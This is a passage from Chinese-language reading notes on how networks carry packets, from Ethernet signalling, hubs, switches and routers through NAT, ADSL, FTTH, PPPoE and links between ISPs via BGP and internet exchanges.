bit，校验和，方便接收方判断所接收到的数据是否完整和正确，用来排除传输过程中的信号干扰； 之所以会有波形的概念，然后在于 1 和 0 会被转化成特定的电压和电流，这样电压和电流就会出现变化，形成波；理论上，接收方在收到电信号波后，可以将其还原成 0 和 1。但这里面存在一个问题，当连续出现 1 或 0 的时候，波形没有变化，这个时候就抓瞎了，不知道该段波形中包含几个 1 或 0； 为了能够能够一段没有变化的波形中，包含几个 1 或 0，就需要引入时钟单位，每个时钟单位对应一个比特。这样就可以知道一段没有变化的波形包含几个比特的 1 或 0 了；最简单粗暴的办法，是增加一条线路，将时钟信号也发给接收方。这样接收方就可以根据时钟信号，对另外一条线路中的数据信号进行解读。 但是这又引入了一个新的问题，当有两条线路时，它们很难是一样长度的。随着距离超长，二者的长短误差就会变得越大。大到一定程度时，就会导致时钟偏移（偏左或偏右了），这样最终读取出来的数据就不准确了； 为了解决偏移问题，一个巧妙的办法是将两种信号叠加起来，然后额外告知对方时钟的变化周期，让双方的时钟周期实现同步。这就是报头的作用，报头本质上是一段让接收方获得发送方时钟周期的特殊信号；接收方在收到数据包后，解析报头，获得时钟信号。然后反算出数据信号； 向集线器发送网络包网卡的 MAC 模块为数据添加头部、分界符和校验值之后，就可以调用 PHY（MAU）模块将数据转成电信号发送出去。日常生活中经常听到的 10M 或 100M 带宽的意思即是每秒种可以将多少数字信号转成电信号； 集线器的工作方式是半双工的，意思是同一个时刻，要么是发送状态，要么是接收状态，两种状态不能同时存在，有点像对讲机；因此，在给集线器发送信号之前，网卡需要先判断一下当前的线路状态，如果处于空闲就可以发送；如果正在发送上一组信号，或者正在接收信号，则需要等待；当多台设备同时发送信号时，就会出现信号碰撞，导致传输的信号无效。这时检测到碰撞的设备会广播碰撞信号，所有收到广播的设备都会终止发送。然后根据各自的 MAC 地址计算出各自的等待时间，之后再开始发送； 交换机的工作方式是全双工的，接收和发送可以同时发生，因此不会发生信号碰撞的问题，传输效率要高很多，也比较简单； MAC 模块转换成的电信号是通用格式，但实际是线路有很多规格，不同规格有不同的电信号模式。因此 PHY 模块需要负责将通用电信号转换成特定类型的电信号。例如 10BASE-T 类型的电信号以变化代表 1，没有变化代表 0，如下图： 接收返回包包的接收过程和发送过程刚好是反过来的，区别在于 MAC 模块将数据存入缓冲区后，需要发出中断信号，这样 CPU 才会宠幸一下，将控制权转移给中断处理程序，中断处理程序再通知网卡驱动程序，把缓冲区中的数据拿走处理； 网卡驱动程序取到数据后，从 MAC 头部解析出以太网类型（如 0800 表示 TCP&#x2F;IP），然后调用相应的栈议栈（如 TCP&#x2F;IP）对数据包进行处理。协议栈拿到数据后，对头部进行解析，判断消息应该交给哪个应用程序进行处理； 将服务器的响应包从 IP 传递给 TCPIP 模块在收到网卡驱动程序的数据包后，会先检查一下这个包是否属于自己（通过比对接收方 IP 地址和当前网卡的 IP 地址是否一致）；如果一致，就接收；如果不一致，就报错； IP 模块报错的方法是按照 ICMP 协议给发送方发一条 ICMP 消息（类型 3，Destination Unreachable），常见的消息如下： 类型0：Echo reply，用来响应类型 8 的 Echo 消息； 类型3：Destination unreachable，告知对方包未送达目的地，中途被丢弃了；例如因为目标 IP 地址不在路由表中、目标端口号没有对应的套接字等； 类型4：Source quench，告知对方收到太多包了，超负荷了，要求对方降低发送速度； 类型5：Redirect，重定向，告知对方正确的发送地址； 类型8：Echo，ping 消息，用来检查一下对方是否存在。如果存在，对方会回个类型 0 的消息；如果没有回，表示不存在； 类型11：Time exceeded，告知对方收到当前数据包时， TTL 已经减为 0 因此包被丢弃了； 类型12： Parameter problem，告知对方头部存在字段错误； 有时候 IP 模块还需要做一项“分片重组”的工作。出现这种情况是因为 TCP 数据包比较大，因此需要分成多个小包；这些小包在头部有标记相同的包 ID，同时还有偏移量。因此，IP 模块可以基于这些信息实现重组； IP 模块完成工作后，会将数据包交给 TCP 模块。TCP 模块会根据接发双方的 IP 地址和端口号，从映射表里面找到对应的套接字，然后根据套接字中的状态，执行不同的操作： 如果是数据包，则返回 ACK 消息，并将数据存入缓冲区，等待应用程序来取； 如果是控制包，则按规则执行相应的动作； 注意，由于 TCP 模块需要用到 IP 头部中的信息，因此 IP 模块在将数据包转给 TCP 模块处理时，并没有将 IP 头部去掉，不然 TCP 模块就得不到该数据了； UDP 协议的收发操作不需要重发的数据用 UDP 发送更高效TCP 协议为了保证数据完整到达，建立了一套 ACK 机制，因此整个传输过程相对比较复杂（交换控制信息、交换窗口大小、互发 ACK，互发断开信号等）；但有些场景并不需要确保数据完整到达，例如音频和视频数据，丢几个包也没什么大不了；又或者像 DNS 查询，数据很少，一个包就装得下了，不存在丢失其中一个包的情况；此时就可以使用更加简化的 UDP 协议来传输数据。由于不需要保证每个包都到达，一下子事情就变得简单多了； 发现发送一段数据，UDP 协议只要一个来回就行了，TCP 要好几个来回，多搞不少事情； 控制用的短数据类似 DNS 查询之类的短数据，就很适合使用 UDP 来通信；UDP 协议有多简单呢，简单到在收到应用程序的消息后，只需要加上 UDP 头部，之后就可以将数据包转给 IP 模块处理了，其他工作统统没有；如果丢包了，只要过一段时间发现没有返回响应，再重发一次就好了； UDP 头部总共有 8 字节（64 bit），包含以下几个字段： 发送方端口：16 bit 接收方端口：16 bit 数据长度：16 bit，头部之后的数据长度，注意这里头部的长度是固定的，但数据部分的长度不固定； 校验和：16 bit 音频和视频数据由于音频和视频播放场景对丢包的容忍度比较高，但对播放流畅度有要求，因此也很适合使用 UDP 来传输数据； 有时防火墙会阻止 UDP 协议，因此需要更改规则对 UDP 放行，要么就只能改用 TCP 协议来发送了； 从网线到网络设备信号在网线和集线器中传输每个包都是独立传输的包从网卡出来后，在网络中的传输过程是只涉及到 MAC 头部和 IP 头部，因此 TCP 头部和内容，都与传输过程无关，因为在传输过程中用不到里面的数据； 防止网线中的信号衰减很重要 信号传输的本质其实是在网线上施加正负变化的电压，但是在发送端很清晰准确的电压值，在传输过程中，随着距离加大，会出现衰减，并且也会受到干扰。因此，当信号到达接收端的时候，其波形以及电压值有可能失真。如果失真的程度很大，则会造成信号值解析错误； 双绞是为了抑制噪声当网线周围存在电磁波时，由于信号线是金属，因此会在信号线上产生电流，叠加到原本的信号电流，导致电流受到干扰出现失真；双绞线的原理，就是让网线不是直的，而是呈螺旋型，这样网线一直在左右两个方向拐来拐去改变方向。而根据电磁波的原理，它会在不同方向的网线上产生方向相反的电流，因此这两部分电流刚好相互抵销； 其他降低噪声的措施： 在信号线外部包裹金属屏蔽网； 在信号线之间增加隔板； 集线器将信号发往所有线路以太网最初的设计是广播机制，即信号被广播到所有连接到同一网络的设备，然后由各个设备自行判断当前数据包是否属于自己；是就接收，不是就丢弃； 网线支持全双工，这意味着发送信号和接收信号的线是分工单独运行的，因此当两个设备使用网线进行连接的时候，需要使用交叉接线，不然发送对发送，信号就碰撞了；网卡一般是直线接线（MDI），集线器默认是交叉接线（MDI-X），这样网卡可以用网线直接连接到集线器即可正常工作。但是如果是两台集线器之间，就需要做切换转换，集线器一般自带信号转换开关。开关的作用是将当前接口由默认的 MDI-X 模式转换为 MDI 模式；如果是两台计算机直连，则需要使用交叉网线； 集线器的功能非常简单，大部分是使用中断电路，将发送方的信号，原封不动的广播到所有其他设备上面（貌似非常吻合早期的原始场景）； 交换机的包转发操作交换机根据地址表进行转发交换机比集线器智能一点，不再广播数据包，而是维护一张 MAC 地址和端口的映射表，然后收到数据包里面，从 MAC 头部解析出 MAC 地址，再从映射表中查询到相应的端口，之后将数据包转发给该端口上面的设备即可； 当然，为了得到数据包中的 MAC 地址，交换机也是需要会出不少代价的，它需要做一遍普通网卡需要做的数据包解析工作。因此，可以将每个交换机上面的端口近似看做一张网卡。唯一的不同是交换机端口会接收所有的包，不像网卡会丢弃不属于自己的包； 网卡支持开启 MIX 模式，在该模式下，网卡会接收所有的包。如果在计算机中安装一个软件对包按 MAC 地址进行转发，那么计算机就可以扮演交换机的功能，相当于”软交换机“； 交换机通过交换电路来实现转发。交换电路的原理也非常简单，它通过一个二维的开关网格，来实现输入端和输出端之间的电路连接。通过操控网格中的电子开关，就可以将任意一路输入端和任意一路输出端连接起来；而且可以并发转不同的输入端信号； MAC 地址表的维护MAC 地址表的维护涉及两个动作，分别如下： 添加：当收到一个数据包时，解析出其中的发送方 MAC 地址后，将其写入地址表，映射到相应的端口号上面； 删除：定期删除记录，以避免设备断开旧端口，切换到新接口； 特殊操作 当交换机发现某个包的接收方 MAC 地址和发送方 MAC 地址相同时，就会丢弃该包，因为无法实现转发； 当交换机发现某个包的接收方 MAC 地址不在地址表中时，就会在网络中广播这个包； 当交换机发现某个包的接收方 MAC 地址是一个广播地址时，也会广播该包；广播地址有标准格式，即 6 个 FF，或者 IP 地址中的 4 个 255； 全双工模式可以同时进行发送和接收早期的以太网规范只规定了半双工模式，但显然这种传输方式由于要避免信号碰撞，导致传输效率低下。后来规范进行了更新，开始支持全双工模式； 为了支持全双工模式，网卡中的 MAC 模块需要由分别负责发送和接收两个独立模块组成； 自动协商：确定最优的传输速率在以太网的连接中，当双方没有传输数据时，线路并不是空闲的，而是会持续发送脉冲信号，用来检测当前线路是否处于正常连接的状态；当连接正常时，网卡上的 LED 指示灯会显示绿色； 早期的脉冲信号很简单，仅用来探测连接正常即可。后来人们利用信号中的偶数位置，来传递有意义的信号，用于双方的工作模式和传输速率自动协商； 交换机可同时执行多个转发操作由于交换机每次只将数据包转发给特定的端口，其他端口并不会接收到该数据包，因此其他端口也可以同时发送或接收自己的数据，即所有的端口都是可以同时工作的，不像集线器模式下，当某个端口广播数据时，其他端口只能停下来并接收数据； 路由器的包转发操作路由器的基本知识路由器的核心功能也是包的转发，它与交换机的区别在于，交换机是面向以太网设计的，因此基于 MAC 地址进行转发判断；而路由器是基于互联网设计的，因此它是基于 IP 地址进行转发判断； 路由器主要由两个模块组成，一个是端口模块，一个是转发模块。转发模块负责判断数据包的目的地（类似 IP 模块，基于路由表的查询），端口模块则负责具体收发操作（类似网卡）； 不同的路由器拥有一种或多种端口，可以支持多种不同的网络，例如无线局域网、ADSL、FTTH（光纤）、以太网等； 路由器和交换机的一个最大区别在于，交换机只是通过交换电路，帮助收发双方的电路实现连接，它本身并不参与其中。但路由器则不同，它是以独立的中间人身份介入整个收发过程的。发送方和接收方并没有直接互联，而是对接路由器这个中间方；相当于接收方只知道路由器的存在，并没有和发送方直接打交道；为了扮演中间人的作用，路由器上的每个端口都有自己的 IP 地址，而交换机则没有（但也可以有，如果开启 DHCP 功能的话）； 路由器有点像是一个透明代理 路由表中的信息交换机维护的是 MAC 地址映射表，而路由器维护的则是 IP 地址映射表； 10.10.1.0 &#x2F; 255.255.255.0 所表达的含义和 10.10.1.0 &#x2F; 24，是完全相同的，都是用来表示匹配该地址的前 24 个位即可；子网掩码的功能是用来表示需要匹配目标地址多少个位；因此，会存在多种匹配级别，例如前8位、前16位、前24位，前32位等；当为前32位时，由于 IPv4 地址总共也才 32 位，因此已经是全部匹配了，此时一般对应某台具体的主机； 当匹配到某条路由记录后，就可以读取记录中的端口号，用来作为数据包的转发目标； 交换机的 MAC 地址表是由交换机自动维护的，而路由器上的路由表，则同时支持自动维护和手工维护两种模式；自动维护会涉及到路由协议，常见的路由协议有 RIP, OSPC, BGP 等； 路由器的包接收操作路由器的包接收操作跟普通网卡基本没有区别，如果它发现数据包中的 MAC 地址跟当前端口的 MAC 地址不同，它也会像网卡一样，直接丢弃该包，而不会像交换机那样将包收下来； 查询路由表确定输出端口当路由器在路由表中匹配到多条记录时，最长匹配长度的那条记录将胜出，做为转发目标；如果有多条记录匹配的长度相同，那么跃点数最少的那条记录胜出；如果在路由表中查询不到匹配记录，则丢弃该包，并给发送发送一条 ICMP 消息，告知目标 IP 地址有误； 由于路由表中一般设置有默认匹配路由，所以丢弃包的情况貌似不太容易出现； 找不到匹配路由时选择默认路由默认路由的子网掩码为 0.0.0.0，它表示需要匹配的比特位数量为 0 个，因此相当于匹配所有了；计算机的网卡 IPv4 属性设置中，也有一个默认网关，其实它就是在设置默认路由； 包的有效期路由器在转发包的时候，会更新其中数据包头部的 TTL 值，以避免回环；默认值一般为 64 或者 128； 通过分片功能拆分大网络包由于路由器支持多种端口，因此可能存在收到的数据包尺寸大于端口能够支持的最大尺寸，此时路由器就需要对包作分片的动作，以便能够将包转发出去； 有两种情况不允许分片： 头部字段禁止分片；遇到情况会丢弃该包，并发送 ICMP 消息通知发送方； 数据包已经分过片了； 路由器的发送操作和计算机相同路由在转发数据包时与计算机网卡发送数据包的过程基本相同。唯一的不同点是在计算机上面，网关地址即是目标发送地址，根据该地址查询 MAC 地址并添加到 MAC 头部即可。但路由器的网关地址一般为空，此时需要根据最终目标 IP 地址来查询 MAC 地址并添加到 MAC 头部（注：查询回来的结果并不是绑定目标 IP 地址的设备 MAC 地址，而其实是下一个中转设备的 MAC 地址（如交换机或路由器）； 路由器与交换机的关系IP 路由器工作在 IP 层面，它通过查询目标 IP 地址的 MAC 地址，然后将其写到 MAC 头部中；之后交换机通过该头中的 MAC 地址，将数据包转发到下一个路由器； 路由器的附加功能通过地址转换有效利用 IP 地址如果全世界每一个计算机都分配一个 IPv4 地址的话，按照 IPv4 地址的长度来计算，是完全不够分配的，因为计算机的数量增长得太快了。因此，人们制订了规则，将当时还未分配的三段 IPv4 地址，设置为仅限内部子网使用。这样每家公司都可以在其子网内自行分配 IP 地址，而不用担心和其他公司产生冲突。而为子网的出口设备分配一个公共 IP，这样子网内的计算机可以和子网外的计算机进行通信了；这个机制是很好的，但是在数据包从子网内到子网外时，需要增加一个动作，即对其做地址转换才行； 私有地址分别有以下三段： 10.0.0.0 至 10.255.255.255，约可容纳 1600 万台； 172.16.0.0 至 172.31.255.255，约可容纳 100 万台； 192.168.0.0 至 192.168.255.255，约可容纳 6 万台 地址转换的基本原理地址转换的原理非常简单，就是将数据包 IP 头部中的私有地址和端口，改成公有地址和新端口，并在内部建立映射表，然后发送出去。建立映射表的目的是当接收方返回数据时，可以根据映射表再次转换，将数据包转发给内网的设备； 改写端口号的原因如果不改写端口号，那么只能通过 IP 地址来区分不同的内网设备，这时就需要分每台内网分配一个唯一的公共 IP 地址，并在连接结束后收回。这种方式虽然也可行，但无法最大化的节省公共 IP 地址。因为当内网设备很多的时候，并且有同时上网的需求，就会分配一大堆的公共 IP 地址； 从互联网访问公司内网地址转换会带来一个有趣的副作用，即如果地址转换映射表中没有记录，从互联网进入内网的包就不知道应转发给哪个设备，此时路由器就会丢弃该包。该副作用是可以保护内网设备的安全性，防止非法入侵； 路由器的包过滤功能所谓的包过滤，指根据 MAC 头部、IP 头部、TCP 头部中的内容，与提前预设的规则进行匹配，然后根据匹配结果，决定是否丢弃包，还是转发包；多数防火墙软件即是基于包过滤来实现； 虽然包过滤的原理很简单，但是想要实现正确的配置，在实现正常访问的同时，还能够防止非常入侵，是非常困难的 通过接入网进入互联网内部 ADSL 接入网的结构和工作方式互联网的基本结构和家庭、公司网络是相同的互联网的基本结构和家庭或公司内部网络是相同的，主要不同点如下： 由于物理距离变长和线路的信号衰减，因此需要在中间增加很多路由器作为中间转发设备； 路由器上面的路由表由于转发记录很大，其维护机制有所不同； 连接用户与互联网的接入网不管是互联网接入路由器，还是以太网路由器，它们的主要职责和原理都是一样的，即根据路由包负责包的转发。有多种方式可以将家庭或公司接入互联网，例如 ADSL（电话线）、FTTH（光纤）、CATV（有线电视）等，因此互联网接入路由器会基于入网规则来转发包； ADSL：asymmetric digital subscriber line，不对称数字用户线路。利用现有电话线进行通信的技术，它的特点是上行和下行不对称； ADSL Modem 将包拆分成信元 当使用 ADSL 来接入网络时，接入路由器通常使用 PPPoE 方式进行连接，因此路由器会按照 PPPoE 规则，给包加上PPP 头部、PPPoE 头部和 MAC 头部，然后再将包发送给 ADSL Modem；Modem 的职责是将收到的包拆成 ATML 信元，然后转成电信号发送给运营商的 Modem； ATM：Asynchronous Transfer Mode，异步传输。ATM 信元也是一种数据包，但是它很小，头部只有 5 个字节，数据主体只有 48 字节，使用 ATM 通信协议； ADSL 之所以使用 ATM 将包拆分成更小的单位，其初衷是尽可能提高兼容性，降低设备的开始和投入成本； ADSL 将信元“调制”成信号网线在传输数字信号时，一般使用方波，它的优点是简单，但缺点是容易失真，随着距离变长，出错率会上升。ADSL 为了克服容易失真的缺点，使用了正弦波（圆滑波形）合成信号（调制）来表示 0 和 1； 调制信号有很多种方法，例如振幅调制、相位调制。它们的区别在于使用不同的方法来表示 0 和 1，甚至表示更多的位，例如用 4 种振幅分别表示 00、01、10、11 等（虽然振幅越多可以表示更多种情况，但也更容易误判出错）； 相位调制也可以让波从不同位置开始来表示四种情况，示例如下： 正交振幅调制通过结合振幅调制和相位调制，就可以用表示四种情况；由于振幅和相位是不同维度的特征，因此这种维度结合方案，相对单维度的细分方案，更加健壮不容易出错； ADSL 通过使用多个波来提高速率波是可以有多种频率的，而通过滤波器我们又可以将不同频率的波分离出来。因此，通过将多种频率的波合成在一起，我们就可以在单位时间内传递更多的信号，而单位时间可以传递的信号数量即是带宽。 ADSL 通过合成上百个不同频率的波，来实现更大的带宽。为了降低分离难度，每种波使用一定的频率范围，不同波之间的频率间隔为 4.312 KHz，并且都使用正交振幅进行调制； 另外不同频段的波，其受到的环境噪声不一样（一般来说，频段越高，衰减和噪声越大）。如果某个频段的环境噪声小，就可以分配更多的比特位；如果噪声大，就分配较少的比特位； ADSL 之所以能够实现上下行不同的速率，其原因就在于它为上行和下行分配了不同的数量的频段。上行的频段数量少一些，下行的多一些。 噪声和衰减由环境的影响很大，因此每条线路都会存在不同的情况。在为频段分配比特位时，为了提高分配效率，ADSL 在线路通电初始化时，会先做一个测试。根据测试结果，为不同的频段分配最合理数量的比特数（该过程称为训练，一般需要消耗几秒到几十秒左右的时间）； 分离器的作用由于 ADSL 借助电话线进行信号的传播，因此电话信号和网络信号会同时在电话线上存在。分离器的作用，就是根据信号的频率，将电话信号（低频信号）分离出来，并将电话信号转给电话机。不然电话机如果收到所有的信号，就会导致电话声音包含很多噪声，无法听清； 电话机在接通和挂断信号的瞬间，会导致线路的信号出现突然的增加和减少，因此会改变噪声条件。正常情况下，当噪声条件改变时，Modem 之间就需要重新握手。显然这样很不合理，因为在接听或挂断电话时，就会导致网络中断。分离器的另外一个作用，就是避免这种情况的出现。 从用户到电话局电信号从 Modem 出来后，就是走的日常的电话线路了。一般一幢大楼有很多住户或公司，因此每家住户或公司的电话线会先到达本栋大楼的 IDF（中间配线盘） 或 MDF （主配线盘），然后到达保安器（用来防雷击），最后汇成一股，接到室外的电线杆，延伸到电信局附近，然后走到地下，通过电缆隧道，进入电信局大楼的地下室。之所以最后一段要走地下，是为了避免电信局附近竖起大量的电线杆，一来占地太多，二来有火灾隐患； 配线盘的目的是将电信局出来的线路与各住户或公司进行一一对应； 噪声的干扰由于电话线也是使用金属来传递电信号，因此它不可避免也会出现噪声干扰的问题；由于电话线设计之初并未考虑到会用来传递 ADSL 高频信号，因此它比双绞网线更容易受到噪声的干扰； 由于电话线传递的是多频合成的信号，其中只有和噪声频率相近的频段会受到噪声的影响，其余频段不受影响，因此最终接收方收到的可用信号变少了。由于在通电初始化时会检测可用频段，因此当出现噪声时，它不会像网线一样出现信号丢失，而是可用频段变少，传输速度下降而已； 通过 DSLAM 到达 BASDSLAM：DSL Access Multiplexer，数字用户线路接入复用设备；相当于多路 Modem 集成器，可以同时处理多个用户端 Modem 发过来的信号；理论上电话局也可以为每个用户配备一个 Modem，但显然这样需要大量的空间来放置 Modem；使用 DSLAM 就可以节省空间了； 家用 Modem 有一个以太网接口，用来连接用户家里的路由器，而电信局的 DSLAM 一般不使用以太网接口，因为它不跟电信局路由器直接连接，而是使用 ATM 接口，先跟 BAS 设备连接，之后 BAS 设备再跟路由器连接； BAS 是一台包转发设备（一种特定类型的专用路由器），它的职责是将 ATM 信元还原成原始的包，然后去掉 MAC 头部和 PPPoE 头部，为余下的 PPP 头部及其主体数据添加隧道协议的专用头部（例如 L2TP 协议），发给后面的隧道专用路由器； 光纤接入网（FTTH）光纤的基本知识 FTTH：Fiber To The Home，或许可以翻译为光纤入户； ADSL 在电话中上复合多个不同的频率的电信号来传输数据，光纤则简单得多，它使用明暗两种光线来表示 0 和 1； 单模与多模光本质上也是一种电磁波，因此光之间也会相互干扰；从光源射入光纤的光线有很多束，光束在被反射后，会出现相位的改变，而相位不同的光线会相互抵销；因此，只有特定入射角的光束能够在光纤中顺利向前传播，其他光束则因彼此相互干扰而抵销了； 光纤分单模和多模，其区别在于单模光纤的直径较细，因此只有最小入射角的光线，才能够保持相位一致并在光纤中传播；多模光纤由于直径较粗，存在多个满足相位一致的入射角光束，可以有多条光线在光纤中传播，因此接收设备对光敏元件的要求比较低，可以降低成本； 但它带来了另外一个问题，随着反射角度的变大，光线在光纤中反射的次数就会增多，传输距离变长，传输用时变多，因此和反射角度小的光线有到达时间差。如果时间差足够大，就会造成信号失真，因此，多模光纤的传输距离上限较小一些； 通过光纤分路来降低成本FTTH 架构和 ADSL 差不多，只是 ADSL 的 Modem 在 FTTH 中被换成了光纤收发器，它的职责就是将数据转在光信号发送出去。为了避免上行光信号和下行光信号产生互相干扰，上行和下行会使用不同波长的光线来传输数据，并使用棱镜分离原理获取所需的信号； 除了光纤收发器外，还有一种成本更低的做法，它的原理是上行的时候使用排队机制。用户端使用 ONU 设备，电信局端使用 OLT 使用；OLT 会给接入的多个用户信号进行排队，然后指示 ONU 设备按分配到队列序号发送光信号，这样多台客户端 ONU 设备发送的信号就不会出现冲突。当服务器返回响应时，OLT 会给数据包添加用户端编号，并广播到所有 ONU 设备上。ONU 检查收到的数据包，如果编号匹配，就接受；如果不匹配，就丢弃（有点像集线器和网卡的配合）； 不管 FTTH 使用直连还是分路的方式，都可以使用 PPPoE 来传输数据包； 接入网中使用的 PPP 和隧道用户认证和配置下发多数 ADSL 使用 PPPoE 协议来完成认证和配置下发（例如分配公共 IP 地址）的工作。传统的 PPP 拨号流程如下： RADIUS：Remote Access Dial-In User Service，拨号用户远程登录服务； LCP：Link Control Protocol，连接控制协议 PAP：PPP Authentication Protocol，PPP 认证协议； IPCP：Internet Protocol Control Protocol； 在以太网上传输 PPP 消息由于 ADSL 或 FTTH 线路是由 ISP 提供并直接连接 BAS 端口，因此理论上并不需要用户+密码的登录动作。但为了方便管理用户，多数运营商会使用 PPPoE 协议进行用户认证，这样有两个好处： 用户可以输入不同的用户名和密码，在不同的运营商之间进行切换； 运营商可以根据用户名，统计用户的流量； 在拨号上网的时代，使用专线传输，因此 PPP 协议可以使用 HDLC 协议作为容器。但到了非专线的 ADSL 和 FFTH 的时代，PPP 协议无法和以太网兼容，因此需要做一些改进，新的协议标准即为 PPPoE，Point to Point Protocol over Ethernet. ADSL Modem 在收到路由器发过来的以太网数据包后，需要先将其转成 ATM 信元，之后再转成电信号，然后传送出去，到达电信局的 DSLAM； FTTH 光纤收发器在收到路由器的以太网数据包后，无须转 ATM 信元，而是直接转成光信号，然后传送出去，到达电信局的多路光纤收发器； 通过隧道将网络包发送给运营商BAS 在收到 PPPoE 数据包后，进行解析，去掉 MAC 头部和 PPPoE 头部，从中取出 PPP 消息体，进行认证； 所谓的隧道，其实只是一种抽象。它表示通过建立某种形式的连接，将数据包从一头原封不动的传输到另一头。TCP&#x2F;IP 栈即是一种隧道方案，另外还可以其他封装方案； 接入网的整体工作过程 用户在接入互联网的路由器上面配置 ISP 运营商提供的用户名和密码； 路由器基于 PPPoE 协议，广播一条消息，查询 BAS 的 MAC 地址（有点像 ARP 的 MAC 寻址）； BAS 返回消息，告知路由器自己的 MAC 地址； 路由器得到 BAS 的 MAC 地址，使用 CHAP 或 PAP ，将用户名和密码发送给 BAS； BAS 收到用户名和密码，进行校验，如果密码正确，使用 IPCP 将配置信息（公有 IP 地址、DNS 服务器 IP 地址和默认网关的 IP 地址等）发送给路由器； 路由器收到配置信息，更新自身的配置参数； 客户端开始发送 TCP&#x2F;IP 数据包； 路由器为数据包添加 PPP 头部、PPPoE 头部、MAC 头部，由 Modem 转成电信号，发出给 DSLAM； DSLAM 将电信号还原成 PPPoE 数据包，转给 BAS； BAS 去掉数据包的 PPPoE 头部，得到 PPP 包，通过隧道发给运营商内部的路由器； 好奇客户端在完成 PPPoE 拨号连接后，后续的包是否需要携带用户名密码？还是携带会话 ID 即可？理论上首次登录时，运营商的 BAS 路由器应该会与认证服务器（存储用户信息）通信，验证用户名和密码是否正确；如果正确，理论上 BAS 应该在本地生成会话，并将会话 ID 下发给客户端即可；这样后续每次收到客户端的数据包，只需检查其中的 PPPoE 头部是否包含有效的会话 ID 即可，无需再次连接认证服务器进行验证； 不分配 IP 地址的无编号端口假设用户家里的接入路由器和运营商的 BAS 路由器是一对一连接的，那么包只有一条传输线路，肯定会到达 BAS 路由器，理论上完全没有必要为数据包添加 PPPoE 头部，而且也不需要为用户的接入路由器分配公有 IP 地址。这种不分配 IP 地址的方式称为无编号端口； 互联网接入路由器将私有地址转换成公有地址当使用路由器接入互联网时，BAS 会将公有地址分配给路由器。而位于路由器背后的局域网中的计算机，则只拥有路由器分配的私有地址。因此，当路由器收到内部局域网中的计算机的数据包时，需要做地址转换的动作，即将数据包中的私有 IP 地址转换成公网 IP 地址； 如果没有使用路由器，而是让计算机直连到 ADSL Modem 或者光纤收发器上面，那么计算机就会直接拥有公网 IP 地址； 除 PPPoE 以外的其他方式除了 PPPoE 外，还有一些其他连接方式，例如 PPPoA；PPPoA 和 PPPoE 的区别在于不给 PPP 消息添加 MAC 和 PPPoE 头部，而是直接将 PPP 消息转换成 ATM 信元 直接发送出去。PPPoE 之所以要添加 MAC 头部，是因为这样可以遵守以太网协议，Modem 可以充当一条以太网直接，和路由器用网线连接。当 PPPoA 不使用 MAC 头部时，就意味着 Modem 和路由器之间不可以使用网线连接，而是需要集成在一起； 最近几年国内运营商提供的 Modem 好像都是集成路由功能的，但里面的路由功能很弱鸡，所以大部分用户又不得不再自行购买一台更高性能的路由器； 集成在一起会减少一些灵活性的损失，例如更换设备时，需要整套更换，而不能只更新其中的一部分。但好处是少了一些头部后，数据包可容纳的数据量变多了，MTU 比较大，间接提高了传输速度； 另外还可以不使用 PPP，而是使用 DHCP 的方式给用户的路由器下发配置信息，这样就无须用户填写用户名和密码并对其进行验证；由于免去了 PPP 头部，还可以间接增加 MTU； 虽然 DHCP 也使用 ADSL Modem，但这个 Modem 的作用有所不同，它无须将数据转成信元，而转成 ADSL 信号发直接送出去； DHCP：Dynamic Host Configuratin Protocol，动态主机配置协议；路由器可以借助该协议，将网络配置信息告知主机，这样主机就可以通过路由器接入互联网； 网络运营商的内部POP 和 NOC互联网上面的内容，不管是内容访问方，还是内容提供方，他们都需要依赖运营商来实现对接；运营商跟使用者之间使用 POP 设备进行连接；从 ADSL、FTTH 发出的信号，最终会到达 POP 设备，然后进入互联网； POP：Point of Presense，互联网接入点，即运营商暴露给使用者的路由器； NOC：Network Operation Center，网络运行中心，即运营商内部对接多个 POP 设备的中心设备。 POP 设备有很多种类型，具体使用哪种类型，取决于运营商使用哪种线路和上下游进行对接； POP 中连接用户端的路由器需要配备很多端口，以便可以和很多用户同时对接；由于 POP 到用户端的线路速率，因此相对于接骨干网的路由器，接入用户端的路由器的性能要求会低一些；而 NOC 设备由于要同时处理很多 POP 设备的数据，因此它的性能要求很高，其数据吞吐能力是普通 POP 设备的 3-4 个数量级； 室外通信线路的网络包家庭或公司内部的网络连接，由于数据量较小，因此一般使用双绞线就足够了；但对于运营商来说，网线不够用，一般需要使用光纤来传输数据； 在室外铺设光纤的费用是很高的，只有拥有足够多客户的公司才能够承担。对于小运营商来说，更合理的方案是向大运营商租借线路的通信能力； 跨越运营商的网络包运营商之间的连接当用户的数据包到达 POP 路由器之后，如果目的地服务器刚好也是使用同一家运营商，那么就好办了。POP 只需查询自己的路由表，即可知道应该将数据包转发给哪台内部的 POP 路由器或者 NOC 路由器； 路由器之间会相互交换路由信息，从而自动更新自身的路由表； 如果目的地服务器属于另外一家运营商管理，那也没有问题。因为运营商之间也是用路由器相互连接的，因此彼此也拥有对方的路由信息，从而可以查询到转发目标； 运营商之间的路由信息交换分配给运营商的 IP 地址不是单个，而是整段的。当运营商在自己的路由器中配置了该段 IP 地址后，该路由器就可以使用 BGP 协议，将该信息发给相连接的其他运营商路由器，同时对方路由器也会发过来它负责的 IP 段； BGP：Border Gateway Protocol，边界网关协议； 有两种路由交换方案： 转接：A 不但发送自己的子网，还发送自己知道的互联网上所有的路由信息；这种方案的好处是被告知者 B 可以知道 A 背后还有谁，有些包可以通过 A 作为中介到达 A 背后的运营商； 对等：A 仅发送自己的子网；被告知者 B 只会将属于 A 子网的数据包发给 A，不属于 A 的就不会发了； 与公司网络中自动更新路由表机制的区别运营商之间的路由器，跟普通公司内部的路由器在本质上并没有什么区别。但是由于运营商之间存在线路费用的关系，因此在制定和交换路由规则上面，需要有所考量，不能像普通路由那样使用最短路径； 假设某个运营商的线路对外是收费的，那么他就会在路由规则中设置只转发交过费用的运营商的数据包，同时拒收那些未交费的运营商的数据包；另外，由于不同运营商的收费标准不同，因此在选择路由路径时，会设置一定的优先级，以降低成本； 保证用户能够访问互联网中任意一台机器，是运营商的基本职责。虽然出于成本考量，不一定选择最短路径，但终究是可达的； IX 的必要性运营商之间可以使用专线实现一对一的连接，但如果运营商很多，这种一对一的专线方案就显得成本太高了，更合适的方案是引入一个中心设备，各家运营商只需连接到该中心设备，数据包通过中心设备统一转发即可 IX：Internet Exchange，互联网交换中心； 由于 IX 同时对接多家运营商，因此其数据吞吐量非常大，有些甚至高达 200Gbit 每秒； 运营如何通过 IX 互相连接IX 本质上是一台交换机，与普通交换机的区别在于它的端口特别多，而且性能非常好（目前主流是使用 10Gbit&#x2F;s 的光纤端口）； 